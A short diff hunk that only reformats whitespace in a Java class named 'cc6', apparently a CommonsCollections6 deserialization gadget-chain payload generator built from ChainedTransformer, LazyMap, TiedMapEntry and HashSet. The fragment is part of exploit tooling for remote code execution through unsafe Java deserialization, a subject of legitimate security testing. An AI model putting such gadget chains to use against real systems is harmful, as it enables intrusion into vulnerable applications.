@@ -42,10 +42,10 @@ public class cc6 implements ObjectPayload<Serializable> {
 
         Transformer transformerChain = new ChainedTransformer(transformers);
 
-        final Map    innerMap = new HashMap();
-        final Map    lazyMap  = LazyMap.decorate(innerMap, transformerChain);
-        TiedMapEntry entry    = new TiedMapEntry(lazyMap, "QI4L");
-        HashSet      map      = new HashSet(1);
+        final Map innerMap = new HashMap();
+        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
+        TiedMapEntry entry = new TiedMapEntry(lazyMap, "QI4L");
+        HashSet map = new HashSet(1);
         map.add("QI4L");
         Field f = null;
         try {
